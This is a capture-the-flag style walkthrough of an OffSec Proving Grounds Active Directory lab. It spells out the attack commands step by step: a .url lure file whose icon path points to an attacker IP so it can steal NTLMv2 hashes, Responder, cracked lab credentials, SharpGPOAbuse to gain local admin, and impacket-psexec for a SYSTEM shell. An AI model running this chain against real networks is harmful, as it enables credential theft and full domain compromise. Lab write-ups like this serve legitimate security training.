# Vault II — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## TL;DR

Writable `DocumentsShare` SMB share → `.url` file NTLMv2 capture via Responder → Crack hash to get `anirudh:SecureHM` → BloodHound reveals `WriteDacl` on Default Domain Policy → SharpGPOAbuse to add `anirudh` to LocalAdmin group → gpupdate → PsExec for Domain Admin.

---

## Enumeration

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 192.168.231.172
```

**Open Ports:**
- **53, 88, 135, 139, 445**: Standard AD services
- **389, 636, 3268, 3269**: LDAP
- **3389**: RDP
- **5985**: WinRM

Domain: `vault.offsec`

Using `smbclient` with anonymous access (or null session):
```bash
smbclient -L //vault.offsec/ -U ''
```

We see a non-standard share named **`DocumentsShare`**. Checking permissions, we discover we have **Write** access to this folder.

---

## Initial Foothold — Web Shortcut NTLM Theft

Because we can write files to an SMB share that is presumably checked by domain users or the system indexer, we can force Windows to authenticate to an external server we control.

We create a malicious shortcut file (`.url`):
```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=any
IconFile=\\192.168.45.226\%username%.icon
IconIndex=1
```

We drop this file into `DocumentsShare` and start `Responder` on our Kali machine:
```bash
sudo responder -A -I tun0
```

When the file is accessed or indexed, the server attempts to reach out to our Kali IP to fetch the "IconFile", feeding Responder an NTLMv2 hash.
We capture the hash for the user `anirudh`.

Cracking the hash yields the password:
`anirudh:SecureHM`

---

## Privilege Escalation — SharpGPOAbuse

Armed with credentials, we run bloodhound-python to map out the Active Directory environment.
Analyzing the BloodHound graph, we discover a massive misconfiguration: the user `anirudh` has **WriteDacl** permissions over the **Default Domain Policy**.

Group Policy Objects (GPOs) control the configuration of machines across the domain. If we can write to the Default Domain Policy, we can push out a change that forces all computers (including the Domain Controller) to add `anirudh` to the local Administrators group.

We use **SharpGPOAbuse** to weaponize this control:
```cmd
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

Once the policy is updated, we force the Domain Controller to pull and apply the latest policies:
```cmd
gpupdate /force
```

With `anirudh` now effectively a Domain Admin, we establish our final shell using `psexec`:
```bash
impacket-psexec vault.offsec/anirudh:SecureHM@vault.offsec
```

We land directly into a **NT AUTHORITY\SYSTEM** shell. 🎉

---

## Key Takeaways

- **SMB Write Access is Lethal:** A single writable SMB share is all it takes to harvest NTLMv2 hashes from unsuspecting users or automated indexing services using `.url`, `.scf`, or `.lnk` files.
- **WriteDacl on GPOs:** If you can modify the Access Control List (ACL) of a Group Policy Object, especially the Default Domain Policy, you own the entire network. SharpGPOAbuse makes this attack incredibly straightforward.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
